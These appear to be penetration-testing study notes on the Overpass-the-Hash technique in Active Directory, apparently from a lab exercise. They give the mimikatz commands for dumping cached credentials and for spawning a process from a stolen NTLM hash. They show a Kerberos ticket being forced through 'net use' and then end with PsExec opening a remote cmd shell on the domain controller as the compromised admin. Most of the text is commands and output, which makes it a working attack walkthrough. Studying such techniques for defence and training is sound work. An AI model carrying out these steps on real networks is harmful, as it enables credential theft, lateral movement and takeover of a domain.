We can "over" abuse an NTLM user hash to gain a full Kerberos TGT or ST, granting us access to another machine or service as that user. 

Ex.
Assume we have compd a client/server that Jeff_Admin user is auth'd to, and that machine is now caching their creds (and therefore their NTLM pw hash).

Validate by dumping pw hash with mimikatz:
`sekurlsa::logonpasswords`

The essence of an Overpass the Hash tech is to turn an NTLM hash into a Kerb ticket and avoid using NTLM auth all together. We can do this with **sekurlsa::pth**. 

This command creates a new PS process in the context of Jeff_Admin user:
`sekurlsa::pth /user:jeff_admin /domain:corp.com
/ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe`
**/user:** User we are targeting
**/domain:** Domain user is part of 
**/ntlm:** Hash type we are targeting
**/run:** Specify process to create in target user's context

We can now use **klist** to list Kerberos tickets:
PS C:\Windows\system32>
`klist`
Current LogonId is 0:0x1583ae
Cached Tickets: (0)

You will see that NO tickets are caches, which is normal since Jeff_Admin hasn't performan an interactive login. 

We can however try to generate a TGT by authenticating to a network share on the DC with **net use**:

PS C:\Windows\system32>
`net use \\dc01`
The command completed successfully.

`klist`
Current LogonId is 0:0x1583ae
Cached Tickets: (3)
... 

Now we have tickets! Including a TGT and TGS for the CIFS service. 

***
We used “net use” arbitrarily in this example but we could have used any
command that requires domain permissions and would subsequently create a
TGS.
***

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerb auth as opposed to NTLM such as **PsExec** app.

PsExec can run remot commands but DOES NOT accept PW hashes. Since we have generated Kerb Tickets and operate in the context of Jeff_Admin in the PS session, we may reuse the TGT to gain code exeuction on the DC.

Launch cmd.exe remotely on the DC as Jeff_Admin:

PS C:\Tools\active_directory>
`.\PsExec.exe \\dc01 cmd.exe`

`ipconfig`
`whoami`



